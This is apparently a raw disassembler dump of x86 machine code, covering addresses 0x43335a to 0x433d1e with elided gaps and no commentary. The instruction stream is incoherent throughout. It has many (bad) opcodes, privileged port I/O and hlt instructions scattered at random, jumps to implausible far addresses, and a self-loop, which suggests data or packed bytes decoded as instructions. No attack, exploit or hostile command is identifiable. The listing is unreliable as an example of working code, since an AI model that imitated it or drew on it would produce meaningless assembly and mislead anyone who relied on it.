  43335a:	xchg   ebp,eax
  43335b:	stos   DWORD PTR es:[edi],eax
  43335c:	xchg   BYTE PTR [ebx+eax*2+0x1e9b8002],ah
  433363:	hlt    
  433364:	mov    cl,0xb4
  433366:	test   BYTE PTR [ebx-0x5],al
  433369:	hlt    
  43336a:	jmp    0x43336a
  43336c:	xchg   BYTE PTR [ebx-0x4905f9f2],dh
  433372:	jae    0x433361
  433374:	out    0x5b,eax
  433376:	imul   eax,DWORD PTR [ebx+edi*8],0xfffffffb
  43337a:	xor    eax,0xe66b993f
  43337f:	ja     0x4333c5
  433381:	adc    BYTE PTR ds:0x49108ef5,al
  433387:	repz inc ebx
  433389:	hlt    
  43338a:	mov    WORD PTR [edx],gs
  43338c:	push   es
  43338d:	jp     0x4333cf
  43338f:	add    eax,0xe63e6c14
  433394:	nop
  433395:	mov    ch,0x0
  433397:	mov    ebx,0xd78aac6
  43339c:	sbb    ah,dh
  43339e:	mov    WORD PTR [edx],ss
  4333a0:	add    eax,0x0
	...
  4333b9:	add    BYTE PTR [eax+0xf180f06],ah
  4333bf:	jo     0x433386
  4333c1:	sbb    esp,DWORD PTR [ebp+esi*8+0x83787b9]
  4333c8:	jle    0x4333d3
  4333ca:	or     al,0x4
  4333cc:	add    BYTE PTR [ebx],0xef
  4333cf:	pop    edi
  4333d0:	aad    0xeb
  4333d2:	outs   dx,BYTE PTR ds:[esi]
  4333d3:	es jmp 0xa2cb77dc
  4333d9:	sbb    al,0x46
  4333db:	hlt    
  4333dc:	cmp    DWORD PTR [edi+0x61ba01b7],eax
  4333e2:	mov    al,BYTE PTR [ecx]
  4333e4:	jmp    0x6824af41
  4333e9:	lock xchg edi,eax
  4333eb:	pop    es
  4333ec:	jmp    0x1dcd79f4
  4333f1:	js     0x433423
  4333f3:	imul   esp,DWORD PTR [esi+0x3f],0xfffffff4
  4333f7:	js     0x4333e4
  4333f9:	nop
  4333fa:	pusha  
  4333fb:	gs and al,0x3
  4333fe:	(bad)  
  4333ff:	frstor [ebx]
  433401:	or     BYTE PTR [edi-0x77969a0c],0x5
  433408:	imul   di,WORD PTR [eax+0x5],0x9096
  43340e:	mov    eax,0x27eb98f8
  433413:	xor    BYTE PTR [eax],al
  433415:	jmp    0x7602bd11
  43341a:	cld    
  43341b:	out    dx,eax
  43341c:	je     0x433403
	...
  433436:	add    BYTE PTR [edx+0x4c54fac6],al
  43343c:	push   0x0
  43343e:	cmp    eax,edx
  433440:	sar    bh,0xe8
  433443:	neg    esp
  433445:	pop    esp
  433446:	cmp    eax,edi
  433448:	add    al,0xfb
  43344a:	xor    al,0x2c
  43344c:	in     al,dx
  43344d:	inc    ebx
  43344e:	mov    cl,0xf6
  433450:	out    dx,eax
  433451:	dec    esi
  433452:	shl    DWORD PTR [ebp-0x6a590514],0xbd
  433459:	mov    esi,0x7ee07b34
  43345e:	(bad)  
  43345f:	inc    DWORD PTR [ebx+ebp*8+0x4eca5]
  433466:	sbb    cl,BYTE PTR [esi+0x58]
  433469:	lea    esp,ds:0x7f2f191c
  43346f:	inc    edi
  433470:	jle    0x4334e5
  433472:	(bad)  
  433475:	mov    eax,0x83eff60e
  43347a:	sub    esi,esp
  43347c:	mov    BYTE PTR [ebp-0x17fb0817],dl
  433482:	dec    BYTE PTR [edx]
  433484:	out    dx,eax
  433485:	cli    
  433486:	jb     0x433457
  433488:	jl     0x4334e5
  43348a:	add    eax,0xd5b7e08
  43348f:	or     bh,dh
  433491:	mov    esi,0xe81b1cd9
  433496:	in     eax,0x3a
  433498:	lock cli 
  43349a:	mov    bh,0x0
	...
  4334b4:	ret    0x51db
  4334b7:	stos   BYTE PTR es:[edi],al
  4334b8:	(bad)  
  4334b9:	push   eax
  4334ba:	ds push cs
  4334bc:	div    BYTE PTR [ebx+0x4c]
  4334bf:	add    BYTE PTR [ecx+0xf],al
  4334c2:	adc    BYTE PTR [ebx-0x14e7d477],cl
  4334c8:	jle    0x4334b7
  4334ca:	mov    ecx,0xe81ae001
  4334cf:	scas   al,BYTE PTR es:[edi]
  4334d0:	out    dx,eax
  4334d1:	push   es
  4334d2:	test   DWORD PTR [ebp-0x17dfe357],0x69c8
  4334dc:	into   
  4334dd:	sar    edi,0xea
  4334e0:	imul   dh
  4334e2:	mov    ecx,0xe802e102
  4334e7:	loop   0x4334f6
  4334e9:	pop    es
  4334ea:	add    BYTE PTR [ebx+0x2ce1f32e],al
  4334f0:	jae    0x4334bb
  4334f2:	(bad)  
  4334f3:	jae    0x4334fc
  4334f5:	fild   WORD PTR [ecx+eax*1+0xd]
  4334f9:	pop    es
  4334fa:	jnp    0x4334df
  4334fc:	data16 loope 0x43351a
  4334ff:	neg    BYTE PTR [esi+0x58317549]
  433505:	ins    DWORD PTR es:[edi],dx
  433506:	and    al,0x18
  433508:	jne    0x433577
  43350a:	sbb    al,BYTE PTR [eax]
  43350c:	int    0xde
  43350e:	and    al,0x10
  433510:	fld    QWORD PTR [esi]
  433512:	or     esi,0x5e
  433515:	sar    BYTE PTR [edx],0xe8
	...
  433530:	add    BYTE PTR [ebx+0x2b],al
  433533:	add    BYTE PTR [eax],al
  433535:	out    0x64,al
  433537:	and    al,0x10
  433539:	jno    0x433554
  43353b:	lea    eax,[ecx+esi*8+0x18]
  43353f:	push   eax
  433540:	push   0xffffff8c
  433542:	pusha  
  433543:	add    al,0x58
  433545:	adc    al,0x65
  433547:	and    al,0x18
  433549:	in     eax,0x32
  43354b:	sub    dh,bh
  43354d:	jmp    0xe6ef:0xf4246e81
  433554:	stc    
  433555:	rol    BYTE PTR [ecx],cl
  433557:	add    DWORD PTR [ebx-0x2e],ebx
  43355a:	scas   al,BYTE PTR es:[edi]
  43355b:	mov    esi,0x5b097f56
  433560:	mov    esi,0x3c7edbf8
  433565:	test   dh,bh
  433567:	inc    esp
  433568:	add    ch,dh
  43356a:	push   ecx
  43356b:	cmp    eax,0x10ea352
  433570:	push   ebx
  433571:	stos   DWORD PTR es:[edi],eax
  433572:	xor    ch,BYTE PTR [esp+edi*4+0x6c]
  433576:	push   ds
  433577:	add    al,0x53
  433579:	retf   
  43357a:	retf   0x9c11
  43357d:	push   es
  43357e:	sbb    al,0x4
  433580:	xchg   DWORD PTR [edi+esi*8],esp
  433583:	div    DWORD PTR [ebx-0x5]
  433586:	inc    ebx
  433587:	mov    WORD PTR [esi],cs
  433589:	hlt    
  43358a:	fistp  DWORD PTR [eax-0x5]
  43358d:	loope  0x43357e
  43358f:	adc    eax,DWORD PTR [eax-0xc]
  433592:	pusha  
  433593:	mov    edi,0x73
	...
  4335ac:	add    BYTE PTR [eax],al
  4335ae:	in     al,dx
  4335af:	cmp    dl,BYTE PTR [esi-0x5]
  4335b2:	or     DWORD PTR [esi+ecx*1+0x119f440],eax
  4335b9:	adc    eax,0x3ecef8
  4335be:	cmp    eax,DWORD PTR [edx]
  4335c0:	lds    edx,FWORD PTR [edi+edi*2+0x57]
  4335c4:	test   bl,ch
  4335c6:	add    al,0xba
  4335c8:	ins    BYTE PTR es:[edi],dx
  4335c9:	push   ecx
  4335ca:	jno    0x43359c
  4335cc:	into   
  4335cd:	push   edi
  4335ce:	int3   
  4335cf:	mov    al,ds:0x4ab3fb79
  4335d4:	jb     0x4335de
  4335d6:	push   ds
  4335d7:	fsubr  st(6),st
  4335d9:	mov    ds:0x5a003aeb,eax
  4335de:	jo     0x4335fb
  4335e0:	jae    0x4335fa
  4335e2:	add    DWORD PTR [esp+ebp*4],0x93f23bd3
  4335e9:	or     edi,DWORD PTR [edi+0x77]
  4335ec:	loope  0x4335d9
  4335ee:	inc    edi
  4335ef:	sub    al,0xa
  4335f1:	add    BYTE PTR [ecx-0x3c],bh
  4335f4:	jl     0x4335fc
  4335f6:	sbb    eax,ebp
  4335f8:	test   al,0xec
  4335fa:	popa   
  4335fb:	ss sub edx,ecx
  4335fe:	cdq    
  4335ff:	or     cl,ch
  433601:	push   esi
  433602:	jnp    0x4335e4
  433604:	gs call 0x590fb94d
  43360a:	inc    edx
  43360b:	icebp  
  43360c:	call   0x5c990866
  433611:	js     0x433613
	...
  43362b:	fcomp  DWORD PTR [ecx+eiz*1]
  43362e:	in     al,dx
  43362f:	push   es
  433630:	jo     0x4335ec
  433632:	(bad)  
  433633:	jp     0x4335ff
  433635:	ds push edx
  433637:	ins    DWORD PTR es:[edi],dx
  433638:	dec    eax
  433639:	add    eax,0xcd788110
  43363e:	aaa    
  43363f:	lods   al,BYTE PTR ds:[esi]
  433640:	fsubr  st(3),st
  433642:	cmp    bh,0xf0
  433645:	arpl   WORD PTR [eax-0x30],cx
  433648:	push   esp
  433649:	cmp    esp,ebp
  43364b:	jg     0x43363d
  43364d:	cmp    edi,0x3cf4c577
  433653:	arpl   WORD PTR [ecx-0x33],bp
  433656:	pmuludq mm0,QWORD PTR [ecx+0x7e242824]
  43365d:	lods   al,BYTE PTR ds:[esi]
  43365e:	daa    
  43365f:	in     al,0x81
  433661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433662:	daa    
  433663:	in     al,dx
  433664:	jge    0x433612
  433666:	daa    
  433667:	fdivr  QWORD PTR [ebx+0x22]
  43366a:	push   esp
  43366b:	or     DWORD PTR [ecx+0xd],0x549b714
  433672:	sbb    al,0xf9
  433674:	add    al,0x0
  433676:	jmp    0x586fa72
  43367b:	fadd   DWORD PTR ds:0xc3f7e900
  433681:	inc    ebx
  433682:	(bad)
  433685:	cli    
  433686:	jmp    0x986e1382
  43368b:	test   DWORD PTR [edx+ebx*2],0x72
	...
  4336a6:	add    BYTE PTR [eax],al
  4336a8:	pop    ebp
  4336a9:	push   ecx
  4336aa:	mov    edi,0x80dc6e94
  4336af:	add    eax,0xe9faeee8
  4336b4:	fs mov edi,esi
  4336b7:	in     al,0x4a
  4336b9:	jmp    0x43370a
  4336bb:	sar    esp,1
  4336bd:	jmp    0x4336b9
  4336bf:	(bad)  
  4336c0:	jae    0x433672
  4336c2:	jae    0x4336a6
  4336c4:	test   BYTE PTR [ecx-0x14d53b09],al
  4336ca:	out    0x90,eax
  4336cc:	leave  
  4336cd:	add    al,0x0
  4336cf:	mov    al,ds:0xbd875936
  4336d4:	jbe    0x4336b2
  4336d6:	sbb    edi,DWORD PTR [edx]
  4336d8:	mov    ds:0x6ef17487,al
  4336dd:	push   es
  4336de:	push   ebx
  4336df:	pusha  
  4336e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4336e1:	clc    
  4336e2:	mov    WORD PTR [eax+eax*1],ds
  4336e5:	push   esi
  4336e6:	sti    
  4336e7:	cld    
  4336e8:	sti    
  4336e9:	xchg   ebp,edx
  4336eb:	adc    esp,ebx
  4336ed:	imul   eax,DWORD PTR [eax],0x8952f103
  4336f3:	or     al,0xc8
  4336f5:	jmp    0x640a:0xaf7cb94f
  4336fc:	aam    0xef
  4336fe:	cli    
  4336ff:	jmp    0x9cd03c72
  433704:	scas   eax,DWORD PTR es:[edi]
  433705:	push   esp
  433706:	xchg   DWORD PTR [eax],eax
  433708:	pusha  
  433709:	jmp    DWORD PTR [edi+0x2c]
	...
  433724:	add    BYTE PTR [ecx],dl
  433726:	inc    esp
  433727:	add    bh,bh
  433729:	pop    esp
  43372a:	sti    
  43372b:	dec    ebp
  43372c:	jmp    FWORD PTR [ebp+0x1b]
  43372f:	test   eax,eax
  433731:	cmp    BYTE PTR [edx+edx*4+0x0],0x8d
  433736:	add    eax,DWORD PTR [ebx+0x27ae545]
  43373c:	lea    ebp,[eax+0x3d6a4cdb]
  433742:	pop    ebp
  433743:	sbb    al,0x50
  433745:	bound  edx,QWORD PTR [ebx+0x34d00c6]
  43374b:	test   eax,eax
  43374d:	enter  0x2176,0x45
  433751:	push   ecx
  433752:	sub    eax,DWORD PTR [ebp-0x18]
  433755:	stos   DWORD PTR es:[edi],eax
  433756:	bound  ebp,QWORD PTR [ebx]
  433758:	fcmovnbe st,st(6)
  43375a:	inc    edi
  43375b:	in     al,dx
  43375c:	mov    eax,ecx
  43375e:	add    eax,0x6c32851c
  433763:	inc    esp
  433764:	push   0xffffffcd
  433766:	pop    ecx
  433767:	not    DWORD PTR ds:0x4015b1
  43376d:	cwde   
  43376e:	enter  0x376e,0xca
  433772:	pop    edx
  433773:	add    BYTE PTR [ebx-0x371d0ebb],al
  433779:	inc    esi
  43377a:	icebp  
  43377b:	cmc    
  43377c:	mov    eax,DWORD PTR [ebp-0x428b0a7a]
  433782:	jge    0x4337cf
  433784:	adc    al,0xa
  433786:	test   dl,al
  433788:	inc    DWORD PTR [eax]
	...
  4337a2:	jne    0x43376f
  4337a4:	(bad)  
  4337a6:	bound  edi,QWORD PTR [ebp-0x46]
  4337a9:	je     0x433778
  4337ab:	jge    0x4337f8
  4337ad:	adc    al,0xde
  4337af:	enter  0x5c62,0xf4
  4337b3:	addr16 inc esp
  4337b5:	add    BYTE PTR [esp+eax*2],dh
  4337b8:	ret    0xabdc
  4337bb:	inc    edi
  4337bc:	push   ebp
  4337bd:	call   0xfb40712e
  4337c2:	fwait
  4337c3:	mov    eax,ds:0x203986fa
  4337c8:	cmp    DWORD PTR [esi-0x17be1ccc],0x5c893b06
  4337d2:	test   BYTE PTR [ebx+0x43],ah
  4337d5:	hlt    
  4337d6:	jg     0x4337bc
  4337d8:	mov    DWORD PTR [esp+ebx*2-0x76],edx
  4337dc:	dec    esi
  4337dd:	sti    
  4337de:	(bad)
  4337e1:	inc    esp
  4337e2:	pop    esp
  4337e3:	arpl   WORD PTR [eax+edx*2],cx
  4337e6:	push   ebx
  4337e7:	lea    eax,[esi]
  4337e9:	sti    
  4337ea:	shl    edi,0x87
  4337ed:	add    DWORD PTR [edx+0x3b144ece],ebp
  4337f3:	push   ecx
  4337f4:	adc    BYTE PTR [edi-0x500be06],al
  4337fa:	mov    eax,ds:0xc4fb54f3
  4337ff:	pop    ss
  433800:	cmp    DWORD PTR [edi-0x4d4a015],0x0
	...
  43381f:	adc    ebx,DWORD PTR [edi+0x72fc74fb]
  433825:	add    eax,0x5c2c0352
  43382a:	xchg   DWORD PTR [ecx-0x15],edi
  43382d:	xchg   DWORD PTR [ecx],eax
  43382f:	dec    ebx
  433830:	add    al,BYTE PTR [edx+edx*2]
  433833:	jmp    0x433840
  433835:	adc    BYTE PTR [ebp+0x395cf8b4],al
  43383b:	xor    esp,esp
  43383d:	jl     0x433898
  43383f:	jg     0x43381b
  433841:	mov    DWORD PTR [esp+edi*8+0x4],ecx
  433845:	mov    eax,0xe575bf54
  43384a:	push   eax
  43384b:	mov    edi,0x7386a954
  433850:	ja     0x4337f4
  433852:	mov    BYTE PTR [edx+0x4513b380],ch
  433858:	pop    ebx
  433859:	jmp    0x964c5f5a
  43385e:	cld    
  43385f:	inc    ebx
  433860:	or     eax,0x1000c364
  433865:	and    dh,BYTE PTR [esi-0x18]
  433868:	jns    0x433815
  43386a:	mul    DWORD PTR [esi]
  43386c:	out    dx,al
  43386d:	fwait
  43386e:	(bad)  
  433870:	ror    DWORD PTR [ecx],1
  433872:	jbe    0x433878
  433874:	fisttp QWORD PTR [edx-0x3]
  433877:	pop    esi
  433878:	in     eax,dx
  433879:	ins    DWORD PTR es:[edi],dx
  43387a:	inc    esi
  43387b:	add    al,0x7a
  43387d:	loopne 0x4338d2
  43387f:	dec    edi
  433880:	push   ebx
  433881:	loope  0x43380b
	...
  43389b:	add    BYTE PTR [edx+0x56],cl
  43389e:	loop   0x433911
  4338a0:	in     al,dx
  4338a1:	push   ecx
  4338a2:	ficom  DWORD PTR [eax+esi*4-0x79]
  4338a6:	test   al,0x70
  4338a8:	jb     0x433897
  4338aa:	push   ebx
  4338ab:	or     al,0x73
  4338ad:	add    DWORD PTR [esi],edx
  4338af:	sti    
  4338b0:	mov    bl,0x3c
  4338b2:	sbb    bl,BYTE PTR [edx-0x3d]
  4338b5:	mov    ebx,0x57f414a6
  4338ba:	pop    esi
  4338bb:	call   0x5581934
  4338c0:	hlt    
  4338c1:	add    al,0x36
  4338c3:	push   edx
  4338c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4338c5:	pop    esp
  4338c6:	and    eax,0x1053388
  4338cb:	cmp    BYTE PTR [eax+0x45],bh
  4338ce:	jmp    0xe9500fbe
  4338d3:	add    esi,DWORD PTR [ebx-0xb]
  4338d6:	(bad)  
  4338d7:	mov    ecx,0xdeef33b2
  4338dc:	dec    ebx
  4338dd:	jg     0x4338de
  4338df:	call   0x709274db
  4338e4:	sbb    eax,0x45ef86e9
  4338e9:	lock dec edi
  4338eb:	fnsave [esp+ebp*4+0x74]
  4338ef:	enter  0x672,0x8d
  4338f3:	lods   al,BYTE PTR ds:[esi]
  4338f4:	lahf   
  4338f5:	push   ebp
  4338f6:	dec    edi
  4338f7:	ret    
  4338f8:	stc    
  4338f9:	push   esi
  4338fa:	sti    
  4338fb:	cdq    
  4338fc:	sti    
  4338fd:	cmp    DWORD PTR [edi+0x9c],0x0
	...
  433917:	add    BYTE PTR [eax],al
  433919:	daa    
  43391a:	pop    ebp
  43391b:	sbb    al,0x6d
  43391d:	xor    BYTE PTR ds:0x2c7be568,al
  433923:	add    BYTE PTR [ecx],al
  433925:	pushf  
  433926:	verw   cx
  433929:	jb     0x43391f
  43392b:	ss add ah,ah
  43392e:	sbb    cl,BYTE PTR [ebp-0x72c3b454]
  433934:	fs push 0xa7e6faee
  43393a:	jns    0x433980
  43393c:	cdq    
  43393d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43393e:	out    dx,eax
  43393f:	je     0x433912
  433941:	adc    dh,0x86
  433944:	sahf   
  433945:	ss inc ecx
  433947:	mov    al,0x2d
  433949:	clc    
  43394a:	add    al,0x0
  43394c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43394d:	je     0x4338e3
  43394f:	stc    
  433950:	mov    dh,0xe
  433952:	adc    al,0x1
  433954:	jmp    0xa5361650
  433959:	(bad)  
  43395a:	out    dx,al
  43395b:	xchg   dh,ah
  43395d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43395e:	out    dx,eax
  43395f:	dec    edi
  433960:	loope  0x4338e4
  433962:	inc    eax
  433963:	clc    
  433964:	(bad)  
  433965:	call   DWORD PTR [ebx+edi*8+0x0]
  433969:	cld    
  43396a:	clc    
  43396b:	add    BYTE PTR [esi],0x3
  43396e:	lock dec edx
  433970:	or     BYTE PTR [ebp+0x51],dh
  433973:	sub    al,BYTE PTR [eax]
  433975:	fnstsw WORD PTR [edx+0x5b]
  433978:	cld    
  433979:	sbb    DWORD PTR ds:0xc013,eax
	...
  433993:	add    BYTE PTR [eax],al
  433995:	add    BYTE PTR [edx],ah
  433997:	sar    BYTE PTR [ecx-0x40],1
  43399a:	data16 (bad) 
  43399c:	scas   al,BYTE PTR es:[edi]
  43399d:	shl    BYTE PTR ds:0x3afff370,0x4f
  4339a4:	push   esi
  4339a5:	pop    ebx
  4339a6:	in     al,0xc2
  4339a8:	push   ebx
  4339a9:	mov    edi,DWORD PTR [ecx]
  4339ab:	and    esi,0x79e7c
  4339b1:	push   ebx
  4339b2:	inc    ebx
  4339b3:	push   esi
  4339b4:	mov    bl,0x0
  4339b6:	mov    WORD PTR [edi],es
  4339b8:	add    BYTE PTR [ebx-0x28],dl
  4339bb:	jl     0x433a3b
  4339bd:	std    
  4339be:	cli    
  4339bf:	out    dx,al
  4339c0:	dec    edi
  4339c1:	jmp    eax
  4339c3:	add    eax,DWORD PTR [ebx+0x4e05e6f0]
  4339c9:	jmp    FWORD PTR [ebp-0x5]
  4339cc:	test   al,al
  4339ce:	rol    DWORD PTR ds:0x749657b,0xe3
  4339d5:	adc    al,0xc8
  4339d7:	imul   edi,DWORD PTR [edi-0x3],0x4a
  4339db:	in     eax,dx
  4339dc:	dec    edx
  4339dd:	push   0x1d
  4339df:	add    dl,0xff
  4339e2:	inc    ebp
  4339e3:	into   
  4339e4:	xlat   BYTE PTR ds:[ebx]
  4339e5:	call   FWORD PTR [edx+0x7f]
  4339e8:	inc    ebx
  4339e9:	or     al,0x96
  4339eb:	push   es
  4339ec:	dec    ebx
  4339ed:	lea    ebp,[eax+0x5afff884]
  4339f3:	push   edi
  4339f4:	div    DWORD PTR [ebp-0xb]
  4339f7:	push   esi
  4339f8:	not    DWORD PTR [eax+0x0]
	...
  433a13:	hlt    
  433a14:	out    0x33,eax
  433a16:	sti    
  433a17:	jno    0x4339b5
  433a19:	outs   dx,DWORD PTR ds:[esi]
  433a1a:	add    eax,0xe71c016d
  433a1f:	pop    es
  433a20:	pop    ecx
  433a21:	jnp    0x4339a6
  433a23:	shl    BYTE PTR [ebx-0x7],cl
  433a26:	dec    edi
  433a27:	and    ebx,DWORD PTR [edi-0x34]
  433a2a:	cli    
  433a2b:	int3   
  433a2c:	xchg   ebx,eax
  433a2d:	(bad)  
  433a2e:	cli    
  433a2f:	mov    ebx,0x7f183b75
  433a34:	ficom  DWORD PTR [ebx-0x73]
  433a37:	jns    0x433a99
  433a39:	clc    
  433a3a:	cli    
  433a3b:	mov    ds:0xf874f78d,eax
  433a40:	xchg   ecx,eax
  433a41:	test   DWORD PTR [edi-0x18],0xe674c458
  433a48:	dec    eax
  433a49:	jnp    0x4339ce
  433a4b:	and    BYTE PTR [ebx],0xf9
  433a4e:	dec    edi
  433a4f:	and    ebx,DWORD PTR [edi-0x34]
  433a52:	cli    
  433a53:	pop    esp
  433a54:	pop    ebx
  433a55:	xlat   BYTE PTR ds:[ebx]
  433a56:	cli    
  433a57:	imul   esp,DWORD PTR [edi-0x4],0xffffff86
  433a5b:	cli    
  433a5c:	jo     0x433aa1
  433a5e:	cld    
  433a5f:	(bad)
  433a62:	adc    BYTE PTR [edx+0x71104ef2],ch
  433a68:	sbb    al,0x70
  433a6a:	add    al,0x77
  433a6c:	cmp    eax,edi
  433a6e:	jmp    FWORD PTR [esi-0x1e]
  433a71:	or     DWORD PTR [esp+ebp*1+0x2d],0x74f9
	...
  433a91:	xor    bh,cl
  433a93:	dec    edi
  433a94:	add    al,0x59
  433a96:	mov    edi,0x5a5ef073
  433a9b:	clc    
  433a9c:	hlt    
  433a9d:	inc    ebp
  433a9e:	push   0xffffff8d
  433aa0:	sbb    DWORD PTR [edi+0x57],0x20056ee8
  433aa7:	stc    
  433aa8:	(bad)  
  433aa9:	pop    esi
  433aaa:	push   ss
  433aab:	xchg   DWORD PTR [eax-0x23],ebp
  433aae:	xor    ah,ch
  433ab0:	outs   dx,BYTE PTR ds:[esi]
  433ab1:	ins    BYTE PTR es:[edi],dx
  433ab2:	mov    bh,al
  433ab4:	jp     0x433b05
  433ab6:	loope  0x433a73
  433ab8:	inc    ebx
  433ab9:	jno    0x433ae4
  433abb:	add    al,0x79
  433abd:	jmp    0x40422e1f
  433ac2:	jb     0x433b42
  433ac4:	mov    cl,0xf9
  433ac6:	lods   al,BYTE PTR ds:[esi]
  433ac7:	sar    DWORD PTR [edx],cl
  433ac9:	push   0xbc7b0361
  433ace:	fadd   QWORD PTR [ecx+edi*2]
  433ad1:	aaa    
  433ad2:	inc    ecx
  433ad3:	test   BYTE PTR [eax],ah
  433ad5:	stc    
  433ad6:	call   0xa4832a2c
  433adb:	pop    es
  433adc:	jnp    0x433b4d
  433ade:	or     DWORD PTR [esi+0x25],edx
  433ae1:	jmp    0xb9b:0xea33f7b3
  433ae8:	imul   edi,DWORD PTR [edi],0x326f5365
  433aee:	adc    cl,BYTE PTR [esi]
  433af0:	push   esp
  433af1:	push   ss
  433af2:	test   eax,0x3
	...
  433b0b:	add    BYTE PTR [eax],al
  433b0d:	jnp    0x433adb
  433b0f:	ins    DWORD PTR es:[edi],dx
  433b10:	rcl    DWORD PTR [ebx-0x21],0x6
  433b14:	clc    
  433b15:	dec    esi
  433b16:	test   DWORD PTR [edi+edx*1],ebp
  433b19:	dec    edi
  433b1a:	outs   dx,DWORD PTR ds:[esi]
  433b1b:	fucomp st(3)
  433b1d:	and    dh,dh
  433b1f:	loope  0x433b18
  433b21:	outs   dx,DWORD PTR ds:[esi]
  433b23:	add    esp,ebp
  433b25:	dec    eax
  433b26:	not    cl
  433b28:	test   esi,0x1ef299dc
  433b2e:	jmp    0xbc069154
  433b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433b34:	sbb    ah,dh
  433b36:	dec    edi
  433b37:	add    BYTE PTR [edx+0x1c],ah
  433b3a:	test   bl,ch
  433b3c:	test   BYTE PTR gs:[eax+eax*1],0x3a
  433b41:	stos   BYTE PTR es:[edi],al
  433b42:	push   ebp
  433b43:	push   0x287f9d
  433b48:	add    esp,ebx
  433b4a:	jg     0x433b8b
  433b4c:	jmp    0xe9601b20
  433b51:	idiv   DWORD PTR [edi-0x11]
  433b54:	mov    edx,0x81747dae
  433b59:	psubusb mm1,QWORD PTR [edx]
  433b5c:	gs retf 
  433b5e:	add    eax,0x66ee900
  433b63:	callw  0x8ead
  433b67:	mov    DWORD PTR [edi+ebp*4+0x74a94feb],esi
  433b6e:	test   al,0xa
  433b70:	ins    BYTE PTR es:[edi],dx
	...
  433b89:	add    BYTE PTR [esi+0x7ee90005],bh
  433b8f:	push   es
  433b90:	lea    esp,[ebx+edx*4+0x31df6655]
  433b97:	in     al,dx
  433b98:	dec    edi
  433b99:	std    
  433b9a:	je     0x433b44
  433b9c:	or     ah,BYTE PTR [edx+esi*4+0x5]
  433ba0:	add    cl,ch
  433ba2:	pop    eax
  433ba3:	xchg   DWORD PTR [eax],eax
  433ba5:	jmp    0x587bba1
  433baa:	outs   dx,DWORD PTR ds:[esi]
  433bab:	add    BYTE PTR [ebp+0x503a6394],cl
  433bb1:	mul    BYTE PTR [eax-0x4d67ad4]
  433bb7:	add    DWORD PTR [eax+ebp*8+0x3c3904f7],0x5583fb24
  433bc2:	icebp  
  433bc3:	add    al,0x0
  433bc5:	bound  esi,QWORD PTR [eax+ebp*8-0x4ddaff7a]
  433bcc:	cli    
  433bcd:	add    BYTE PTR ds:0xa88d4e04,bl
  433bd3:	cmp    eax,0xffffffff
  433bd6:	push   edx
  433bd7:	push   esi
  433bd8:	push   0xa350ef0
  433bdd:	push   eax
  433bde:	xchg   edx,eax
  433bdf:	push   eax
  433be0:	adc    al,0x85
  433be2:	popf   
  433be3:	push   edi
  433be4:	add    eax,0xe1f11089
  433be9:	adc    esp,DWORD PTR [eax-0x7b]
  433bec:	jp     0x433bec
	...
  433c06:	add    BYTE PTR [edx-0x11],dl
  433c09:	dec    edx
  433c0a:	push   ebx
  433c0b:	pop    esi
  433c0c:	mov    esp,0xcb7ee8f5
  433c11:	cmc    
  433c12:	inc    DWORD PTR [ebp+eax*2-0x10]
  433c16:	mov    ebx,DWORD PTR [eax-0x11]
  433c19:	or     DWORD PTR [eax],0x80937c6b
  433c1f:	xor    bh,ch
  433c21:	cmc    
  433c22:	push   edx
  433c23:	(bad)
  433c26:	xor    DWORD PTR [ecx-0x56ae08ad],ebp
  433c2c:	test   BYTE PTR [edx-0x8cd668c],bh
  433c32:	jmp    0x433cb3
  433c34:	jl     0x433bb9
  433c36:	adc    BYTE PTR [eax],0xef
  433c39:	cmc    
  433c3a:	push   eax
  433c3b:	scas   al,BYTE PTR es:[edi]
  433c3c:	add    dl,0xff
  433c3f:	cmc    
  433c40:	add    eax,0x7af2ffd8
  433c45:	repnz push 0x64
  433c48:	jl     0x433cbd
  433c4a:	test   BYTE PTR [ebp-0x25],ah
  433c4d:	and    eax,0xb2f15278
  433c52:	pop    eax
  433c53:	cdq    
  433c54:	inc    eax
  433c55:	add    BYTE PTR [ebx+0x74f32d6d],cl
  433c5b:	hlt    
  433c5c:	fild   DWORD PTR [edi-0xbf7902e]
  433c62:	xchg   BYTE PTR [ecx+0x3c738c5],ah
  433c68:	and    cl,ah
  433c6a:	add    BYTE PTR ss:[eax],al
	...
  433c81:	add    BYTE PTR [eax],al
  433c83:	add    BYTE PTR [edi],al
  433c85:	sub    DWORD PTR [esi],eax
  433c87:	bound  edi,QWORD PTR [ebp+0x3c056ab7]
  433c8d:	inc    ecx
  433c8e:	mov    BYTE PTR [edi],bh
  433c90:	hlt    
  433c91:	sub    DWORD PTR [edi+0x50],ecx
  433c94:	jns    0x433caf
  433c96:	or     BYTE PTR [edi+0x4a],0x77
  433c9a:	or     ah,al
  433c9c:	push   es
  433c9d:	sbb    al,0x4
  433c9f:	xchg   DWORD PTR [ecx+ebx*2+0x3cdcf83b],ebp
  433ca6:	(bad)  
  433ca8:	ret    
  433ca9:	pop    ebx
  433caa:	ror    BYTE PTR [edi],0xbb
  433cad:	leave  
  433cae:	out    dx,al
  433caf:	xchg   BYTE PTR [esp+edx*2+0x4fabf08a],ah
  433cb6:	dec    ebp
  433cb7:	call   0xfb388a40
  433cbc:	ja     0x433cfc
  433cbe:	cmc    
  433cbf:	je     0x433cb9
  433cc1:	pop    edx
  433cc2:	pop    ebx
  433cc3:	hlt    
  433cc4:	hlt    
  433cc5:	and    eax,0xaff6f43b
  433cca:	das    
  433ccb:	pushw  es
  433ccd:	jno    0x433d3a
  433ccf:	(bad)  
  433cd0:	int3   
  433cd1:	adc    eax,eax
  433cd3:	jb     0x433d40
  433cd5:	jae    0x66ef991f
  433cdb:	repnz mul DWORD PTR [ecx+0xe]
  433cdf:	push   0xd95db44
  433ce4:	fsub   st(0),st
  433ce6:	call   FWORD PTR [ecx+0x0]
	...
  433d00:	add    dh,ah
  433d02:	and    ebp,0xfffffffe
  433d05:	pop    eax
  433d06:	add    eax,0x2246bf7
  433d0b:	adc    DWORD PTR [ecx],0x8938bf73
  433d11:	mov    eax,0x193ec0e8
  433d16:	out    0xc1,al
  433d18:	in     eax,dx
  433d19:	mov    eax,0xdb6fe4f0
  433d1e:	pop    edx
